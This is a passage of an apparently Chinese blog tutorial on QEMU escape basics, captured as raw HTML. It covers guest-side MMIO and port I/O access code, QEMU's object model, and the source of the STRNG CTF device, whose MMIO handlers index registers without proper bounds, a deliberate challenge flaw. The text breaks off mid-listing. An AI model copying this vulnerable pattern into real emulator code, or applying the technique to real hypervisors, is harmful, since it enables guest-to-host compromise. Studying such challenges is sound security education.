class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">    mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="访问pmio"><a href="#访问pmio" class="headerlink" title="访问pmio"></a>访问pmio</h3><p>编译内核模块，在内核空间访问pmio空间，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">inb(port);  <span class="comment">//读取一字节</span></span><br><span class="line">inw(port);  <span class="comment">//读取两字节</span></span><br><span class="line">inl(port);  <span class="comment">//读取四字节</span></span><br><span class="line"></span><br><span class="line">outb(val,port); <span class="comment">//写一字节</span></span><br><span class="line">outw(val,port); <span class="comment">//写两字节</span></span><br><span class="line">outl(val,port); <span class="comment">//写四字节</span></span><br></pre></td></tr></table></figure><p>用户空间访问则需要先调用<code>iopl</code>函数申请访问端口，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h &gt;</span></span></span><br><span class="line"></span><br><span class="line">iopl(<span class="number">3</span>); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure><p>IOPL（Input/Output Privilege Level）系统调用是一种在Intel x86架构中的特权级别切换机制。在x86架构中，存在四个特权级别（0至3），其中0是最高特权级别，3是最低特权级别。IOPL允许用户态程序访问特权级别为0（内核态）的I/O端口，以执行一些需要系统级别权限的操作，比如直接访问硬件设备。</p><h2 id="QOM模型"><a href="#QOM模型" class="headerlink" title="QOM模型"></a>QOM模型</h2><p>QEMU是使用C编写而成,自然没有原生支持类与对象,但QEMU自己实现了一套称为<strong>Qemu Object Model</strong>的技术来实现面向对象</p><p>主要由这四个组件构成：</p><ul><li><code>Type</code>：用来定义一个「类」的基本属性，例如类的名字、大小、构造函数等。</li><li><code>Class</code>：用来定义一个「类」的静态内容，例如类中存储的静态数据、方法函数指针等。</li><li><code>Object</code>：动态分配的一个「类」的具体的实例（instance），储存类的动态数据。</li><li><code>Property</code>：动态对象数据的访问器（accessor），可以通过监视器接口进行检查。</li></ul><p>其中Property不多做关注,重点理解前三个</p><hr><p>上面的介绍乍一看还并不是很容易就懂的,用比较易懂的话再说一遍大概就是</p><p><code>Type</code>用于<strong>描述</strong>一个类,也就是描述一个具体的设备,由结构体<code>Typeinfo</code>实现,<code>Type</code>用于关联<code>Class</code>与<code>Object</code></p><p><code>Class</code>用于描述这个类的通用数据,例如<u>静态数据,方法函数</u>等对于所有类实例都是相同的数据,全局只有一个该<code>class</code></p><p><code>object</code>用于描述这个类的动态数据,也就是<u>独属于</u>每一个类实例的数据</p><h3 id="TypeInfo-类的基本属性"><a href="#TypeInfo-类的基本属性" class="headerlink" title="TypeInfo - 类的基本属性"></a>TypeInfo - 类的基本属性</h3><p><code>TypeInfo</code> 这一结构体用来定义一个 <code>类</code> 的基本属性，该结构体定义于 <code>include/qom/object.h</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * TypeInfo:</span></span><br><span class="line"><span class="comment"> * @name: 类型名.</span></span><br><span class="line"><span class="comment"> * @parent: 父类型名.</span></span><br><span class="line"><span class="comment"> * @instance_size: 对象大小 (#Object 的衍生物). </span></span><br><span class="line"><span class="comment"> *   若 @instance_size 为 0, 则对象的大小为其父类的大小</span></span><br><span class="line"><span class="comment"> * @instance_init: 该函数被调用以初始化对象（译注：构造函数）. </span></span><br><span class="line"><span class="comment"> *   （译注：调用前）父类已被初始化，因此子类只需要初始化他自己的成员。</span></span><br><span class="line"><span class="comment"> * @instance_post_init: 该函数被调用以结束一个对象的初始化，</span></span><br><span class="line"><span class="comment"> *   在所有的 @instance_init 函数被调用之后.</span></span><br><span class="line"><span class="comment"> * @instance_finalize: 该函数在对象被析构时调用. 其在</span></span><br><span class="line"><span class="comment"> *   父类的 @instance_finalize 被调用之前被调用.</span></span><br><span class="line"><span class="comment"> *   在该函数中一个对象应当仅释放该对象特有的成员。</span></span><br><span class="line"><span class="comment"> * @abstract: 若该域为真，则该类为一个虚类，不能被直接实例化。</span></span><br><span class="line"><span class="comment"> * @class_size: 这个对象的类对象的大小 (#Object 的衍生物)</span></span><br><span class="line"><span class="comment"> *   若 @class_size 为 0, 则类的大小为其父类的大小。</span></span><br><span class="line"><span class="comment"> *   这允许一个类型在没有添加额外的虚函数时避免实现一个显式的类型。</span></span><br><span class="line"><span class="comment"> * @class_init: 该函数在所有父类初始化结束后被调用，</span></span><br><span class="line"><span class="comment"> *   以允许一个类设置他的默认虚方法指针.</span></span><br><span class="line"><span class="comment"> *   这也允许该函数重写父类的虚方法。</span></span><br><span class="line"><span class="comment"> * @class_base_init: 在所有的父类被初始化后、但</span></span><br><span class="line"><span class="comment"> *   在类自身初始化前，为所有的基类调用该函数。</span></span><br><span class="line"><span class="comment"> *   该函数用以撤销从父类 memcpy 到子类的影响.</span></span><br><span class="line"><span class="comment"> * @class_data: 传递给 @class_init 与 @class_base_init 的数据,</span></span><br><span class="line"><span class="comment"> *   这会在建立动态类型时有用。</span></span><br><span class="line"><span class="comment"> * @interfaces: 与这个类型相关的接口. </span></span><br><span class="line"><span class="comment"> *   其应当指向一个以 0 填充元素结尾的静态数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="type">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line"></span><br><span class="line">    InterfaceInfo *interfaces;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们在 Qemu 中要定义一个<strong>类</strong>的时候，我们实际上需要定义一个 <code>TypeInfo</code> 类型的变量，以下是一个在 Qemu 定义一个自定义类的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo my_type_info = &#123;</span><br><span class="line">    .name = <span class="string">&quot;my_type&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> my_register_types(<span class="type">void</span>) &#123;</span><br><span class="line">    type_register_static(&amp;my_type_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type_init(my_register_types);</span><br></pre></td></tr></table></figure><p><code>type_init()</code> 其实就是 <code>constructor</code> 这一 gcc attribute 的封装，其作用就是将一个函数加入到一个 <code>init_array</code> 当中，在 Qemu 程序启动时在进入到 main 函数之前会先调用 <code>init_array</code> 中的函数，因此这里会调用我们自定义的函数，其作用便是调用 <code>type_register_static()</code> 将我们自定义的类型 <code>my_type_info</code> 注册到全局的类型表中。</p><h3 id="Class-类的静态内容"><a href="#Class-类的静态内容" class="headerlink" title="Class - 类的静态内容"></a>Class - 类的静态内容</h3><p>当我们通过一个 <code>TypeInfo</code> 结构体定义了一个类之后，我们还需要定义一个 Class 结构体来定义这个类的静态内容，包括函数表、静态成员等，其应当继承于对应的 Class 结构体类型，例如我们若是要定义一个新的机器类，则其 Class 应当继承于 <code>MachineClass</code>。</p><p>所有 Class 结构体类型的最终的父类都是 <code>ObjectClass</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ObjectClass:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 所有类的基类.  #ObjectClass 仅包含一个整型类型 handler</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Type type;</span><br><span class="line">    GSList *interfaces;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line"></span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line"></span><br><span class="line">    GHashTable *properties;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>下面是一个最简单的示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">myClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成 Class 的定义之后我们还应当在前面定义的 <code>my_type_info</code> 中添加上 Class size 与 Class 的构造函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 这里的 oc 参数便是新创建的 Class，全局只有一个该实例</span></span><br><span class="line">    <span class="comment">// 我们应当 cast 为我们自己的 Class 类型，之后再进行相应操作</span></span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo my_type_info = &#123;</span><br><span class="line">    .name = <span class="string">&quot;my_type&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(myClass),</span><br><span class="line">    .class_init = my_class_init,</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Object-类的实例对象"><a href="#Object-类的实例对象" class="headerlink" title="Object - 类的实例对象"></a>Object - 类的实例对象</h3><p>我们还需要定义一个相应的 Object 类型来表示一个实例对象，其包含有这个类实际的具体数据，且应当继承于对应的 Object 结构体类型，例如我们若是要定义一个新的机器类型，其实例类型应当继承自 <code>MachineState</code></p><p>所有 Object 结构体类型的最终的父类都是 <code>Object</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Object:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 所有对象的基类。该对象的第一个成员为一个指向 #ObjectClass 的指针。</span></span><br><span class="line"><span class="comment"> * 因为 C 中将一个结构体的第一个成员组织在该结构体的 0 字节起始处，</span></span><br><span class="line"><span class="comment"> * 只要任何的子类将其父类作为第一个成员，我们都能直接转化为一个 #Object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 因此, #Object 包含一个对对象类的引用作为其第一个成员。 </span></span><br><span class="line"><span class="comment"> * 这允许在运行时识别对象的真实类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="type">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>下面是一个示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">myObject</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Object parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成 Object 的定义之后我们还应当在前面定义的 <code>my_type_info</code> 中添加上 Object size 与 Object 的构造函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_object_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 这里的 obj 参数便是动态创建的类型实例</span></span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo my_type_info = &#123;</span><br><span class="line">    .name = <span class="string">&quot;my_type&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .instance_init = my_object_init,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(myObject),</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(myClass),</span><br><span class="line">    .class_init = my_class_init,</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类的创建与释放"><a href="#类的创建与释放" class="headerlink" title="类的创建与释放"></a>类的创建与释放</h3><p>类似于在 C++ 当中使用 <code>new</code> 与 <code>delete</code> 来创建与释放一个类实例，在 QOM 中我们应当使用 <code>object_new()</code> 与 <code>object_delete()</code> 来创建与销毁一个 QOM 类实例，本质上就是 <code>分配/释放类空间 + 显示调用构造/析构函数</code></p><p>QOM 判断创建类实例的类型是通过类的名字，即 <code>TypeInfo-&gt;name</code>，当创建类实例时 Qemu 会遍历所有的 TypeInfo 并寻找名字匹配的那个，从而调用到对应的构造函数，并将其基类 <code>Object-&gt;class</code> 指向对应的 class</p><p>下面是一个示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create a QOM object</span></span><br><span class="line">myObject *myobj = object_new(<span class="string">&quot;my_type&quot;</span>);</span><br><span class="line"><span class="comment">// delete a QOM object</span></span><br><span class="line">object_delete(myobj);</span><br></pre></td></tr></table></figure><hr><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-02_212637.png" alt=""></p><h2 id="QOM实例"><a href="#QOM实例" class="headerlink" title="QOM实例"></a>QOM实例</h2><h3 id="Object与Class"><a href="#Object与Class" class="headerlink" title="Object与Class"></a>Object与Class</h3><p>这里以接下来要做的例题Strng为例,看看具体如何使用QOM写就一个PCI设备</p><p>首先是一个类的动态数据也就是<strong>Object部分</strong>,因为创建的是PCI设备,所以选择父类为PCIDevice</p><p>这里声明了两块内存<code>mmio</code>何<code>pmio</code>,以及几个寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line">    <span class="type">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="type">void</span> (*srand)(<span class="type">unsigned</span> <span class="type">int</span> seed);</span><br><span class="line">    <span class="type">int</span> (*rand)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">int</span> (*rand_r)(<span class="type">unsigned</span> <span class="type">int</span> *seed);</span><br><span class="line">&#125; STRNGState;</span><br></pre></td></tr></table></figure><p>之后是<strong>Class部分</strong>,本题没有定义直接使用PCIDeviceClass</p><p>不过也有不少题目会选择创建一个空的class模板,例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">STRNGClass</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    PCIDeviceClass parent;</span><br><span class="line">&#125; STRNGClass;</span><br></pre></td></tr></table></figure><p>然后还有将父类转为子类的宏，因为 QOM 基本函数传递的大都是父类指针，所以我们需要一个宏来进行类型检查 + 转型，这也是 Qemu 中惯用的做法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG(obj) OBJECT_CHECK(STRNGState, obj, <span class="string">&quot;strng&quot;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="mmio-pmio读写函数"><a href="#mmio-pmio读写函数" class="headerlink" title="mmio/pmio读写函数"></a>mmio/pmio读写函数</h3><p>下面我们开始定义 MMIO 与 PMIO 的操作函数，并声明上两个 MemoryRegion 对应的函数表，需要注意的是这里传入的 <strong><code>hwaddr</code> 类型参数其实为相对地址而非绝对地址：</strong></p><p><strong>mmio</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">strng_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span> || addr &amp; <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> ~<span class="number">0ULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> strng-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="type">uint32_t</span> saddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span> || addr &amp; <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    saddr = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">switch</span> (saddr) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        strng-&gt;srand(val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        strng-&gt;regs[saddr] = strng-&gt;rand();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        strng-&gt;regs[saddr] = strng-&gt;rand_r(&amp;strng-&gt;regs[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        strng-&gt;regs[saddr] = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_mmio_ops = &#123;</span><br><span class="line">    .read = strng_mmio_read,</span><br><span class="line">    .write = strng_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>pmio</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 